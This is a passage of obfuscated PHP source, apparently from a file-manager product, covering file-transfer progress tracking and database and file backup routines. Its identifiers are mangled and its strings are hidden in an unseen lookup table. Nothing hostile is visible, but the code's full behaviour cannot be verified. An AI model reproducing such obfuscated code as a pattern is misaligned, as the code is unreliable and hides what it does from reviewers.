$ƒ¤˜ÉÀÇ; } public static function valueSet($ÆÎŞûü, $ñĞÈ®ê£) { $á€£ñÅš =& $_SERVER[ÕŸ²ó÷å]; if (!$ñĞÈ®ê£) { return Model($á€£ñÅš[529])->where(array($á€£ñÅš[107] => $ÆÎŞûü, $á€£ñÅš[33] => $á€£ñÅš[1153]))->delete(); } $ƒšŞšóŞ = json_encode($ñĞÈ®ê£); if (!$ƒšŞšóŞ) { ob_start(); var_dump($ñĞÈ®ê£); $úË•š‚Ä = ob_get_clean(); self::log($á€£ñÅš[1800] . json_encode_force($úË•š‚Ä)); } if (!$ÆÎŞûü || !$ñĞÈ®ê£[$á€£ñÅš[484]]) { return !1; } $–—ï·ò… = array($á€£ñÅš[33] => $á€£ñÅš[1153], $á€£ñÅš[1773] => USER_ID, $á€£ñÅš[107] => $ÆÎŞûü, $á€£ñÅš[459] => $ƒšŞšóŞ); $¶Ú¢šÃÌ = $á€£ñÅš[1801]; CacheLock::lock($¶Ú¢šÃÌ); Model($á€£ñÅš[529])->add($–—ï·ò…, array(), !0); CacheLock::unlock($¶Ú¢šÃÌ); } public static function log($˜—êç¹) { if (!GLOBAL_DEBUG) { return; } write_log($˜—êç¹, $_SERVER[ÕŸ²ó÷å][1802]); } } class TaskFileTransfer extends Task { protected function startAfter() { $‰é¾ïã¥ =& $_SERVER[ÕŸ²ó÷å]; $È€Êà ß =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($‰é¾ïã¥[1803], array($this, $‰é¾ïã¥[1804])); Hook::bind($‰é¾ïã¥[1311], array($this, $‰é¾ïã¥[1805])); Hook::bind($‰é¾ïã¥[1806], array($this, $‰é¾ïã¥[1807])); Hook::bind($‰é¾ïã¥[677], array($this, $‰é¾ïã¥[1808])); Hook::bind($‰é¾ïã¥[678], array($this, $‰é¾ïã¥[1809])); Hook::bind($‰é¾ïã¥[684], array($this, $‰é¾ïã¥[1810])); Hook::bind($‰é¾ïã¥[685], array($this, $‰é¾ïã¥[1811])); Hook::bind($‰é¾ïã¥[680], array($this, $‰é¾ïã¥[1812])); Hook::bind($‰é¾ïã¥[682], array($this, $‰é¾ïã¥[1813])); Hook::bind($‰é¾ïã¥[646], array($this, $‰é¾ïã¥[1814])); Hook::bind($‰é¾ïã¥[643], array($this, $‰é¾ïã¥[1814])); Hook::bind($‰é¾ïã¥[648], array($this, $‰é¾ïã¥[1814])); Hook::bind($‰é¾ïã¥[650], array($this, $‰é¾ïã¥[1814])); Hook::bind($‰é¾ïã¥[652], array($this, $‰é¾ïã¥[1814])); Hook::bind($‰é¾ïã¥[1815], array($this, $‰é¾ïã¥[1816])); Hook::bind($‰é¾ïã¥[668], array($this, $‰é¾ïã¥[1817])); $this->sourceModelCopyFlag = !1; Hook::bind($‰é¾ïã¥[1818], array($this, $‰é¾ïã¥[1819])); Hook::bind($‰é¾ïã¥[1820], array($this, $‰é¾ïã¥[1821])); Hook::bind($‰é¾ïã¥[1822], array($this, $‰é¾ïã¥[1823])); $È€Êà ß[$‰é¾ïã¥[1824]] = LNG($‰é¾ïã¥[1825]); $È€Êà ß[$‰é¾ïã¥[1826]] = 0; $È€Êà ß[$‰é¾ïã¥[1827]] = 0; $È€Êà ß[$‰é¾ïã¥[1146]] = $‰é¾ïã¥[12]; $È€Êà ß[$‰é¾ïã¥[1828]] = $‰é¾ïã¥[12]; $È€Êà ß[$‰é¾ïã¥[1829]] = 0; $È€Êà ß[$‰é¾ïã¥[1830]] = 0; $È€Êà ß[$‰é¾ïã¥[1831]] = 0; if (!$È€Êà ß[$‰é¾ïã¥[1662]]) { $È€Êà ß[$‰é¾ïã¥[1662]] = LNG($‰é¾ïã¥[1832]); } } protected function endAfter() { $ôıÎ¯„É =& $_SERVER[ÕŸ²ó÷å]; Hook::unbind($ôıÎ¯„É[1803], array($this, $ôıÎ¯„É[1804])); Hook::unbind($ôıÎ¯„É[1311], array($this, $ôıÎ¯„É[1805])); Hook::unbind($ôıÎ¯„É[1806], array($this, $ôıÎ¯„É[1807])); Hook::unbind($ôıÎ¯„É[677], array($this, $ôıÎ¯„É[1808])); Hook::unbind($ôıÎ¯„É[678], array($this, $ôıÎ¯„É[1809])); Hook::unbind($ôıÎ¯„É[684], array($this, $ôıÎ¯„É[1810])); Hook::unbind($ôıÎ¯„É[685], array($this, $ôıÎ¯„É[1811])); Hook::unbind($ôıÎ¯„É[680], array($this, $ôıÎ¯„É[1812])); Hook::unbind($ôıÎ¯„É[682], array($this, $ôıÎ¯„É[1813])); Hook::unbind($ôıÎ¯„É[646], array($this, $ôıÎ¯„É[1814])); Hook::unbind($ôıÎ¯„É[643], array($this, $ôıÎ¯„É[1814])); Hook::unbind($ôıÎ¯„É[648], array($this, $ôıÎ¯„É[1814])); Hook::unbind($ôıÎ¯„É[650], array($this, $ôıÎ¯„É[1814])); Hook::unbind($ôıÎ¯„É[652], array($this, $ôıÎ¯„É[1814])); Hook::unbind($ôıÎ¯„É[1815], array($this, $ôıÎ¯„É[1816])); Hook::unbind($ôıÎ¯„É[668], array($this, $ôıÎ¯„É[1817])); Hook::unbind($ôıÎ¯„É[1818], array($this, $ôıÎ¯„É[1819])); Hook::unbind($ôıÎ¯„É[1820], array($this, $ôıÎ¯„É[1821])); Hook::unbind($ôıÎ¯„É[1822], array($this, $ôıÎ¯„É[1823])); } public function copyMoveStart($·Ù½éïö, $Â½õõÜí, $ûñèã¸, $Ÿü³â™®) { $…ûİ¢É =& $_SERVER[ÕŸ²ó÷å]; self::log($…ûİ¢É[1833] . $Â½õõÜí . $…ûİ¢É[83] . $Ÿü³â™®); $€°·œ¢æ = rtrim(TEMP_FILES, $…ûİ¢É[8]); if (substr($Â½õõÜí, 0, strlen($€°·œ¢æ)) == $€°·œ¢æ) { return; } if (substr($Ÿü³â™®, 0, strlen($€°·œ¢æ)) == $€°·œ¢æ) { return; } $ï‘ßç× =& $this->task; $ï‘ßç×[$…ûİ¢É[1834]] = KodIO::transferType($·Ù½éïö, $ûñèã¸); $this->update(); } public function updateAfter() { $ŒøôÀ÷ =& $_SERVER[ÕŸ²ó÷å]; $ö›ñ«İå =& $this->task; if (!$ö›ñ«İå[$ŒøôÀ÷[847]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ö›ñ«İå[$ŒøôÀ÷[1834]] == $ŒøôÀ÷[1404]) { return; } self::updateTask($ö›ñ«İå); } private static function updateTask(&$”‰äâÈ) { $“šö¢àÏ =& $_SERVER[ÕŸ²ó÷å]; if ($”‰äâÈ[$“šö¢àÏ[1834]] == $“šö¢àÏ[1282] || $”‰äâÈ[$“šö¢àÏ[1834]] == $“šö¢àÏ[120]) { if ($”‰äâÈ[$“šö¢àÏ[1828]]) { $”‰äâÈ[$“šö¢àÏ[1831]] = $”‰äâÈ[$“šö¢àÏ[1830]] + $”‰äâÈ[$“šö¢àÏ[1827]]; } } else { if ($”‰äâÈ[$“šö¢àÏ[1834]] == $“šö¢àÏ[1405]) { if ($”‰äâÈ[$“šö¢àÏ[1828]] == $“šö¢àÏ[1282]) { $”‰äâÈ[$“šö¢àÏ[1831]] = $”‰äâÈ[$“šö¢àÏ[1830]] + $”‰äâÈ[$“šö¢àÏ[1827]] * 0.5; } else { if ($”‰äâÈ[$“šö¢àÏ[1828]] == $“šö¢àÏ[120]) { $”‰äâÈ[$“šö¢àÏ[1831]] = $”‰äâÈ[$“šö¢àÏ[1830]] + $”‰äâÈ[$“šö¢àÏ[1826]] * 0.5 + $”‰äâÈ[$“šö¢àÏ[1827]] * 0.5; } } } } $”‰äâÈ[$“šö¢àÏ[1775]] = $”‰äâÈ[$“šö¢àÏ[1831]] / $”‰äâÈ[$“šö¢àÏ[847]]; if ($”‰äâÈ[$“šö¢àÏ[1775]] > 0) { $Ïîüİßó = timeFloat() - $”‰äâÈ[$“šö¢àÏ[1777]] - $”‰äâÈ[$“šö¢àÏ[1780]]; $”‰äâÈ[$“šö¢àÏ[1781]] = $Ïîüİßó * (1 - $”‰äâÈ[$“šö¢àÏ[1775]]) / $”‰äâÈ[$“šö¢àÏ[1775]]; } } public function addPath($…ıÏò§) { $úş°­¯„ =& $_SERVER[ÕŸ²ó÷å]; if (!$…ıÏò§) { return; } $²¶ü¸ğË =& $this->task; $Õ£«ëîŒ = IO::infoWithChildren($…ıÏò§); $ö®Ç¼ÚÀ = $²¶ü¸ğË[$úş°­¯„[1835]] ? $²¶ü¸ğË[$úş°­¯„[1835]][$úş°­¯„[1836]] : 0; $²¶ü¸ğË[$úş°­¯„[1835]] = array($úş°­¯„[1836] => $ö®Ç¼ÚÀ + 1, $úş°­¯„[503] => $Õ£«ëîŒ[$úş°­¯„[32]], $úş°­¯„[97] => $Õ£«ëîŒ[$úş°­¯„[97]], $úş°­¯„[591] => $Õ£«ëîŒ[$úş°­¯„[591]] ? $Õ£«ëîŒ[$úş°­¯„[591]] : $Õ£«ëîŒ[$úş°­¯„[97]]); if ($Õ£«ëîŒ[$úş°­¯„[33]] == $úş°­¯„[240]) { $²¶ü¸ğË[$úş°­¯„[1144]] += 1; } else { $²¶ü¸ğË[$úş°­¯„[1144]] += $Õ£«ëîŒ[$úş°­¯„[92]][$úş°­¯„[90]]; if ($Õ£«ëîŒ[$úş°­¯„[203]]) { $²¶ü¸ğË[$úş°­¯„[1144]] += $Õ£«ëîŒ[$úş°­¯„[92]][$úş°­¯„[91]] + 1; } } $²¶ü¸ğË[$úş°­¯„[847]] += $Õ£«ëîŒ[$úş°­¯„[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ìÅàë¿) { } public function sourceAddHashEnd($Ÿ üóïì) { } public function sourceAddFileStart($³ÒüÉÄÜ) { $Áà…¸›… =& $_SERVER[ÕŸ²ó÷å]; $·¦ö½š— =& $this->task; $·¦ö½š—[$Áà…¸›…[1826]] = $³ÒüÉÄÜ[$Áà…¸›…[89]]; $·¦ö½š—[$Áà…¸›…[1824]] = $³ÒüÉÄÜ[$Áà…¸›…[32]]; $·¦ö½š—[$Áà…¸›…[1146]] = $³ÒüÉÄÜ[$Áà…¸›…[32]]; $·¦ö½š—[$Áà…¸›…[1837]] = $³ÒüÉÄÜ[$Áà…¸›…[97]]; $this->update(); } public function sourceAddFileEnd($¼…ÊÜñ¤) { $±ïÉÂ€á =& $_SERVER[ÕŸ²ó÷å]; $¥óĞ÷‰È =& $this->task; $¥óĞ÷‰È[$±ïÉÂ€á[1831]] += $¼…ÊÜñ¤[$±ïÉÂ€á[89]]; $¥óĞ÷‰È[$±ïÉÂ€á[1837]] = $¼…ÊÜñ¤[$±ïÉÂ€á[97]]; $this->update(1); } public function copyFileStart($ Àõ·şš, $øÚÁÆÖĞ, $Ó°ªœÅ, $ ×Ï­®¢, $¸Ì«öé½, $—î²Ñ˜Í) { $ßŒëëœ =& $_SERVER[ÕŸ²ó÷å]; $±ÅÃÊŸ = $¸Ì«öé½; if ($±ÅÃÊŸ == $GLOBALS[$ßŒëëœ[1838]]) { $±ÅÃÊŸ = $GLOBALS[$ßŒëëœ[1839]]; } $GLOBALS[$ßŒëëœ[1839]] = $¸Ì«öé½; $GLOBALS[$ßŒëëœ[1838]] = $—î²Ñ˜Í; $¼€˜¡‰ =& $this->task; $¼€˜¡‰[$ßŒëëœ[1824]] = $±ÅÃÊŸ; $¼€˜¡‰[$ßŒëëœ[1826]] = (int) $ Àõ·şš->size($øÚÁÆÖĞ); $¼€˜¡‰[$ßŒëëœ[1827]] = 0; $¼€˜¡‰[$ßŒëëœ[1146]] = $ßŒëëœ[12]; $¼€˜¡‰[$ßŒëëœ[1828]] = $ßŒëëœ[12]; $¼€˜¡‰[$ßŒëëœ[1829]] = 0; $ĞÜÍ¨ƒ = $¼€˜¡‰[$ßŒëëœ[1826]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¼€˜¡‰[$ßŒëëœ[484]] . $ßŒëëœ[1840]); if ($ĞÜÍ¨ƒ && file_exists(get_path_father($ ×Ï­®¢))) { Cache::set($¼€˜¡‰[$ßŒëëœ[484]] . $ßŒëëœ[1840], $ ×Ï­®¢); $¼€˜¡‰[$ßŒëëœ[1797]] = array($ßŒëëœ[1841], $ßŒëëœ[1842]); } $this->update(0, $ĞÜÍ¨ƒ); } public static function updateCopyLocalFileSize($š’ÜÜÄ¡) { $™¼ä¤‰… =& $_SERVER[ÕŸ²ó÷å]; $ä¡æÂ×† = Cache::get($š’ÜÜÄ¡[$™¼ä¤‰…[484]] . $™¼ä¤‰…[1840]); if (!$ä¡æÂ×† || !file_exists($ä¡æÂ×†)) { return $š’ÜÜÄ¡; } $š’ÜÜÄ¡[$™¼ä¤‰…[1827]] = @filesize($ä¡æÂ×†); $š’ÜÜÄ¡[$™¼ä¤‰…[1831]] += $š’ÜÜÄ¡[$™¼ä¤‰…[1827]]; self::updateTask($š’ÜÜÄ¡); return $š’ÜÜÄ¡; } public function copyFileEnd($ú¨ ‰Ñ, $°Å”Ÿ›™, $óòı¼¡, $ªÖ×ğø®, $ßíì‚µ², $’ç¯éÏ) { $‘İ„»ÖÇ =& $_SERVER[ÕŸ²ó÷å]; $Âì›ºŸÁ =& $this->task; $Âì›ºŸÁ[$‘İ„»ÖÇ[1827]] = $Âì›ºŸÁ[$‘İ„»ÖÇ[1826]]; $Âì›ºŸÁ[$‘İ„»ÖÇ[1828]] = $‘İ„»ÖÇ[12]; unset($Âì›ºŸÁ[$‘İ„»ÖÇ[1797]]); if ($ßíì‚µ² == $Âì›ºŸÁ[$‘İ„»ÖÇ[1824]]) { $Âì›ºŸÁ[$‘İ„»ÖÇ[1830]] += $Âì›ºŸÁ[$‘İ„»ÖÇ[1826]]; $Âì›ºŸÁ[$‘İ„»ÖÇ[1831]] = $Âì›ºŸÁ[$‘İ„»ÖÇ[1830]]; $£šêÂ¸ = 1; if (isset($Âì›ºŸÁ[$‘İ„»ÖÇ[1837]]) && $Âì›ºŸÁ[$‘İ„»ÖÇ[1837]] == $°Å”Ÿ›™) { $£šêÂ¸ = 0; } $this->update($£šêÂ¸); } else { $this->update(); $Âì›ºŸÁ[$‘İ„»ÖÇ[1827]] = 0; } Cache::remove($Âì›ºŸÁ[$‘İ„»ÖÇ[484]] . $‘İ„»ÖÇ[1840]); self::log($‘İ„»ÖÇ[1843] . $°Å”Ÿ›™ . $‘İ„»ÖÇ[83] . $ªÖ×ğø® . $‘İ„»ÖÇ[59] . $ßíì‚µ² . $‘İ„»ÖÇ[1844] . $Âì›ºŸÁ[$‘İ„»ÖÇ[1824]]); } public function updateFileEnd($àÇìÀìç, $´ö°ñÖ) { $ñöÄµÉØ =& $_SERVER[ÕŸ²ó÷å]; $ˆæèÊ£§ =& $this->task; $ˆæèÊ£§[$ñöÄµÉØ[1824]] = $àÇìÀìç; $ˆæèÊ£§[$ñöÄµÉØ[1826]] = $´ö°ñÖ; $ˆæèÊ£§[$ñöÄµÉØ[1830]] += $´ö°ñÖ; $ˆæèÊ£§[$ñöÄµÉØ[1831]] = $ˆæèÊ£§[$ñöÄµÉØ[1830]]; $this->update(1); self::log($ñöÄµÉØ[1845] . $àÇìÀìç); } public function sourceModelCopy($¬öé‘‘) { $áŸâ­ =& $_SERVER[ÕŸ²ó÷å]; $´èÈ¬­ä = $¬öé‘‘[0]; $šëªşÀ = $¬öé‘‘[1]; $ì–î–ıâ =& $this->task; $this->sourceModelCopyFlag = !0; $ öğëı† = 0; switch ($´èÈ¬­ä) { case $áŸâ­[644]: $ öğëı† = 1; break; case $áŸâ­[647]: $ì–î–ıâ[$áŸâ­[1824]] = $šëªşÀ[$áŸâ­[32]]; break; case $áŸâ­[649]: $ öğëı† = intval($¬öé‘‘[$áŸâ­[465]] * 0.4); break; case $áŸâ­[651]: $ öğëı† = intval($¬öé‘‘[$áŸâ­[465]] * 0.2); break; case $áŸâ­[653]: $ öğëı† = intval($¬öé‘‘[$áŸâ­[465]] * 0.4); break; } $this->update($ öğëı†); $this->sourceModelCopyFlag = !1; } public function sourceRemove($”³Ì×Ö€, $š÷®ÑÂ) { $ÌÌ¤Ó­æ =& $_SERVER[ÕŸ²ó÷å]; $this->sourceModelCopyFlag = !0; $’òÉüÕõ = 1; if (isset($”³Ì×Ö€[$ÌÌ¤Ó­æ[92]])) { $’òÉüÕõ = $”³Ì×Ö€[$ÌÌ¤Ó­æ[92]][$ÌÌ¤Ó­æ[90]]; $’òÉüÕõ = $’òÉüÕõ + $”³Ì×Ö€[$ÌÌ¤Ó­æ[92]][$ÌÌ¤Ó­æ[91]] + 1; } $this->update($’òÉüÕõ); $this->sourceModelCopyFlag = !1; } public function sourceMove($çÜàş¥¤) { $this->sourceRemove($çÜàş¥¤, !1); } public function curlProgress($æô—™Ÿ, $óü³ş¿Æ, $šø—”á, $•Ó«Ÿäã, $û‚™ìËË) { $ã“Öİ»û =& $_SERVER[ÕŸ²ó÷å]; $äÜøÉã¢ =& $this->task; if ($û‚™ìËË > 0) { $äÜøÉã¢[$ã“Öİ»û[1146]] = $ã“Öİ»û[1846]; $äÜøÉã¢[$ã“Öİ»û[1828]] = $ã“Öİ»û[120]; if ($äÜøÉã¢[$ã“Öİ»û[1826]]) { $äÜøÉã¢[$ã“Öİ»û[1827]] = $û‚™ìËË; } if ($äÜøÉã¢[$ã“Öİ»û[1829]]) { $äÜøÉã¢[$ã“Öİ»û[1827]] = $û‚™ìËË + $äÜøÉã¢[$ã“Öİ»û[1829]]; } } else { if ($šø—”á > 0) { if ($äÜøÉã¢[$ã“Öİ»û[1826]] == $óü³ş¿Æ) { $äÜøÉã¢[$ã“Öİ»û[1827]] = $šø—”á; $äÜøÉã¢[$ã“Öİ»û[1146]] = $ã“Öİ»û[1847]; $äÜøÉã¢[$ã“Öİ»û[1828]] = $ã“Öİ»û[1282]; } } } $this->update(); } public function curlProgressStart($âÏ›ûã­) { } public function curlProgressEnd($ÕËüŸ) { $Çì¥”Å§ =& $_SERVER[ÕŸ²ó÷å]; $å†êÒ˜ã =& $this->task; $²šëìß¯ = curl_getinfo($ÕËüŸ); $ÇÔÍŸÊ· = $²šëìß¯[$Çì¥”Å§[1848]]; if ($ÇÔÍŸÊ· == -1) { $ÇÔÍŸÊ· = $²šëìß¯[$Çì¥”Å§[1849]]; } if ($å†êÒ˜ã[$Çì¥”Å§[1828]] == $Çì¥”Å§[120] && $ÇÔÍŸÊ·) { $å†êÒ˜ã[$Çì¥”Å§[1829]] += $ÇÔÍŸÊ·; } $this->update(); } } goto CÂ’Îì¡¶‹; E¾ŸÎ±¯ê¤: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Æ€À¡Æ =& $_SERVER[ÕŸ²ó÷å]; $Î½©õËº = Backup::get(); self::$io = $Î½©õËº[$Æ€À¡Æ[836]]; self::$name = $Î½©õËº[$Æ€À¡Æ[32]]; $ÂÉ÷½ì = new DbManage(); $ˆß´›÷Î = $ÂÉ÷½ì->dbType(); $º¢°÷µ¨ = array($Æ€À¡Æ[861] => $ˆß´›÷Î, $Æ€À¡Æ[862] => time()); Backup::set($º¢°÷µ¨); $Ñ†®ªØÎ = $this->tmpFilesPath() . $Æ€À¡Æ[863] . self::$name . $Æ€À¡Æ[8]; del_dir($Ñ†®ªØÎ); mk_dir($Ñ†®ªØÎ); $Ã°ğèº† = $½ş«“±Ì = 0; try { $¹Ü€ËŞ = $ÂÉ÷½ì->db()->getTables(); } catch (Exception $ñÆíøĞ ) { return !1; } $¹Ü€ËŞ = array_diff($¹Ü€ËŞ, array($Æ€À¡Æ[864], $Æ€À¡Æ[865])); foreach ($¹Ü€ËŞ as $ÕÇö¶õÖ) { $Ã°ğèº† += $ÂÉ÷½ì->model($ÕÇö¶õÖ)->count(); } $Î¢êƒº = new Task($Æ€À¡Æ[866], $Æ€À¡Æ[867], $Ã°ğèº†, LNG($Æ€À¡Æ[868]) . $Æ€À¡Æ[869] . LNG($Æ€À¡Æ[870])); $GLOBALS[$Æ€À¡Æ[871]] = self::$name; foreach ($¹Ü€ËŞ as $ÕÇö¶õÖ) { $ïÀ•ØÆ = $Ñ†®ªØÎ . $ÕÇö¶õÖ . $Æ€À¡Æ[872]; $ıéÌå” = null; if ($ÕÇö¶õÖ == $Æ€À¡Æ[873] && (!isset($Î½©õËº[$Æ€À¡Æ[181]]) || $Î½©õËº[$Æ€À¡Æ[181]] == $Æ€À¡Æ[238])) { $ıéÌå” = self::$io; } $½ş«“±Ì += $ÂÉ÷½ì->sqlFromDb($ÕÇö¶õÖ, $ïÀ•ØÆ, $Î¢êƒº, $ıéÌå”); } unset($GLOBALS[$Æ€À¡Æ[871]]); $Î¢êƒº->end(); if ($½ş«“±Ì > $Ã°ğèº†) { $Ã°ğèº† = $½ş«“±Ì; } $º¢°÷µ¨ = array($Æ€À¡Æ[861] => $ˆß´›÷Î, $Æ€À¡Æ[857] => 1, $Æ€À¡Æ[874] => $Ã°ğèº†, $Æ€À¡Æ[875] => $½ş«“±Ì, $Æ€À¡Æ[876] => time()); Backup::set($º¢°÷µ¨); if ($Ã°ğèº† - $½ş«“±Ì > 0) { $ƒª×¾ÉÑ = $Æ€À¡Æ[877]; if (!stristr(I18n::getType(), $Æ€À¡Æ[878])) { $ƒª×¾ÉÑ = $Æ€À¡Æ[879]; } write_log(array($ƒª×¾ÉÑ, $º¢°÷µ¨), $Æ€À¡Æ[867]); return !1; } return !0; } private function tmpFilesPath() { $±ÑåÛØŞ =& $_SERVER[ÕŸ²ó÷å]; $¼ĞıÑÄø = TEMP_FILES; if ($GLOBALS[$±ÑåÛØŞ[6]][$±ÑåÛØŞ[102]][$±ÑåÛØŞ[880]]) { $¼ĞıÑÄø = $GLOBALS[$±ÑåÛØŞ[6]][$±ÑåÛØŞ[102]][$±ÑåÛØŞ[880]]; if (!mk_dir($¼ĞıÑÄø) || !is_writable($¼ĞıÑÄø) || !IO::mkfile($¼ĞıÑÄø . $±ÑåÛØŞ[881])) { $¼ĞıÑÄø = TEMP_FILES; } } return $¼ĞıÑÄø; } } class BackupDbFile { public function __construct() { } public function index() { $†ğ‚ú¶ =& $_SERVER[ÕŸ²ó÷å]; $¸‡‰æœ = Backup::get(); $ã…“ãÀü = $¸‡‰æœ[$†ğ‚ú¶[32]]; $Ú¦õ„ÑÖ = $this->tmpFilesPath() . "\x62\141\x63\x6b\x75\x70\137{$ã…“ãÀü}\x2f"; $˜¿¥»™ó = $this->backupPath($¸‡‰æœ); if (!($˜¿¥»™ó = IO::mkdir($˜¿¥»™ó))) { return !1; } $‡¤áÃ»× = IO::listPath($Ú¦õ„ÑÖ); $Ì€‘Âš¼ = isset($‡¤áÃ»×[$†ğ‚ú¶[96]]) ? $‡¤áÃ»×[$†ğ‚ú¶[96]] : array(); $·Õ€îìÖ = array_sum(array_column($Ì€‘Âš¼, $†ğ‚ú¶[89])); if (!$·Õ€îìÖ) { return !1; } $ïñâŸ« = array($†ğ‚ú¶[882] => $·Õ€îìÖ, $†ğ‚ú¶[883] => time()); Backup::set($ïñâŸ«); $ÚúŠ€¼ß = new TaskFileTransfer($†ğ‚ú¶[884], $†ğ‚ú¶[867], count($Ì€‘Âš¼), LNG($†ğ‚ú¶[868]) . $†ğ‚ú¶[471] . LNG($†ğ‚ú¶[870]) . $†ğ‚ú¶[885]); $ÚúŠ€¼ß->task[$†ğ‚ú¶[847]] = $·Õ€îìÖ; foreach ($‡¤áÃ»×[$†ğ‚ú¶[96]] as $ë‹²ÚÛ¥) { $¡¯ğ¿ = IO::move($ë‹²ÚÛ¥[$†ğ‚ú¶[97]], $˜¿¥»™ó); if (!$¡¯ğ¿) { $ÚúŠ€¼ß->end(); $›¹šÆ“´ = IO::getLastError($†ğ‚ú¶[886] . $ë‹²ÚÛ¥[$†ğ‚ú¶[97]] . $†ğ‚ú¶[887] . $˜¿¥»™ó . $†ğ‚ú¶[188]); write_log($›¹šÆ“´, $†ğ‚ú¶[867]); return !1; } } $Öº¸ô» = new DbManage(); $½Äç™©« = $Öº¸ô»->getSqlFile(); if (!$½Äç™©«[$†ğ‚ú¶[888]] || !$½Äç™©«[$†ğ‚ú¶[13]]) { return !1; } IO::move($½Äç™©«[$†ğ‚ú¶[888]], $˜¿¥»™ó); IO::move($½Äç™©«[$†ğ‚ú¶[13]], $˜¿¥»™ó); $ÚúŠ€¼ß->end(); $ïñâŸ« = array($†ğ‚ú¶[889] => $·Õ€îìÖ, $†ğ‚ú¶[890] => time()); Backup::set($ïñâŸ«); return !0; } private function backupPath($Ã×”Õìæ) { $–ßÁÁõÜ =& $_SERVER[ÕŸ²ó÷å]; $šé‡¥Ğ = $Ã×”Õìæ[$–ßÁÁõÜ[32]]; $áıŞ³‡€ = Model($–ßÁÁõÜ[854])->get($–ßÁÁõÜ[855]); $Šâë‡¨É = substr(md5($–ßÁÁõÜ[856] . $áıŞ³‡€ . $šé‡¥Ğ), 0, 8); return "\173\x69\157\72{$Ã×”Õìæ[$–ßÁÁõÜ[836]]}\x7d\x2f\x64\141\164\141\x62\x61\x73\x65\x2f\x62\141\143\x6b\x75\x70\x2f" . $šé‡¥Ğ . $–ßÁÁõÜ[11] . $Šâë‡¨É; } private function tmpFilesPath() { $úïÀì•£ =& $_SERVER[ÕŸ²ó÷å]; $…ƒ›Ù»² = TEMP_FILES; if ($GLOBALS[$úïÀì•£[6]][$úïÀì•£[102]][$úïÀì•£[880]]) { $…ƒ›Ù»² = $GLOBALS[$úïÀì•£[6]][$úïÀì•£[102]][$úïÀì•£[880]]; if (!mk_dir($…ƒ›Ù»²) || !is_writable($…ƒ›Ù»²) || !IO::mkfile($…ƒ›Ù»² . $úïÀì•£[881])) { $…ƒ›Ù»² = TEMP_FILES; } } return $…ƒ›Ù»²; } } class BackupFile { public function __construct() { } public function index() { $ôÂ¹„½ = Backup::get(); $üíŞ¨„› = $ôÂ¹„½[$_SERVER[ÕŸ²ó÷å][378]][$_SERVER[ÕŸ²ó÷å][240]][$_SERVER[ÕŸ²ó÷å][550]]; $ïÜÎÃÙ = array($_SERVER[ÕŸ²ó÷å][551] => array($_SERVER[ÕŸ²ó÷å][891], $üíŞ¨„›), $_SERVER[ÕŸ²ó÷å][892] => array($_SERVER[ÕŸ²ó÷å][416], $ôÂ¹„½[$_SERVER[ÕŸ²ó÷å][836]])); $”ƒâÃ™¿ = (int) Model($_SERVER[ÕŸ²ó÷å][873])->where($ïÜÎÃÙ)->count($_SERVER[ÕŸ²ó÷å][550]); $³îšÄ = (int) Model($_SERVER[ÕŸ²ó÷å][873])->where($ïÜÎÃÙ)->sum($_SERVER[ÕŸ²ó÷å][89]); $ÎŸÛŠÓ = new TaskFileTransfer($_SERVER[ÕŸ²ó÷å][893], $_SERVER[ÕŸ²ó÷å][867], $”ƒâÃ™¿, LNG($_SERVER[ÕŸ²ó÷å][868]) . $_SERVER[ÕŸ²ó÷å][869] . LNG($_SERVER[ÕŸ²ó÷å][894])); $ÎŸÛŠÓ->task[$_SERVER[ÕŸ²ó÷å][847]] = $³îšÄ; $¤µş¸Ü° = array($_SERVER[ÕŸ²ó÷å][895] => $”ƒâÃ™¿, $_SERVER[ÕŸ²ó÷å][896] => $³îšÄ, $_SERVER[ÕŸ²ó÷å][897] => time()); Backup::set($¤µş¸Ü°); $ç®Ÿ©ì¤ = !0; $Ô³¸âÙµ = $this->storeIds(); $âô£§Ê… = 1; $ç²Å¢¾’ = 1000; $Şæ’° = $éíúúÜ½ = 0; $½³šä¶Ê = array(); $‰Ë¾‰™Š = $åü‚¦ë« = 0; do { $à“¬”Èı = $_SERVER[ÕŸ²ó÷å][898]; $óÓÖİ­Ö = Model($_SERVER[ÕŸ²ó÷å][873])->where($ïÜÎÃÙ)->field($à“¬”Èı)->order($_SERVER[ÕŸ²ó÷å][899])->selectPage($ç²Å¢¾’, $âô£§Ê…); $¤ñ¥×£¡ = !empty($óÓÖİ­Ö[$_SERVER[ÕŸ²ó÷å][454]]) ? $óÓÖİ­Ö[$_SERVER[ÕŸ²ó÷å][454]] : array(); foreach ($¤ñ¥×£¡ as $¼©ñÈ„) { if (!$this->_fileExist($¼©ñÈ„, $½³šä¶Ê, $Ô³¸âÙµ)) { write_log("\146\151\x6c\x65\40\x6e\157\x74\40\145\170\151\x73\164\x2e\146\151\154\x65\111\104\x3a{$¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][550]]}\x2c\x20\160\141\164\150\72{$¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][97]]}", $_SERVER[ÕŸ²ó÷å][900]); continue; } $åÚ˜âŒÊ = $¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][97]]; $É¼ıúÖÎ = "\x7b\151\x6f\x3a{$ôÂ¹„½[$_SERVER[ÕŸ²ó÷å][836]]}\x7d" . substr($åÚ˜âŒÊ, strlen("\x7b\151\x6f\x3a{$¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][901]]}\x7d")); if (IO::exist($É¼ıúÖÎ)) { $ÎŸÛŠÓ->updateFileEnd($¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][32]], $¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][89]]); } else { $É¼ıúÖÎ = get_path_father($É¼ıúÖÎ); IO::mkdir($É¼ıúÖÎ); if (!IO::copy($åÚ˜âŒÊ, $É¼ıúÖÎ, $_SERVER[ÕŸ²ó÷å][902])) { write_log($_SERVER[ÕŸ²ó÷å][903] . $åÚ˜âŒÊ . $_SERVER[ÕŸ²ó÷å][887] . $É¼ıúÖÎ . $_SERVER[ÕŸ²ó÷å][188], $_SERVER[ÕŸ²ó÷å][867]); $ç®Ÿ©ì¤ = !1; break; } } $üíŞ¨„› = 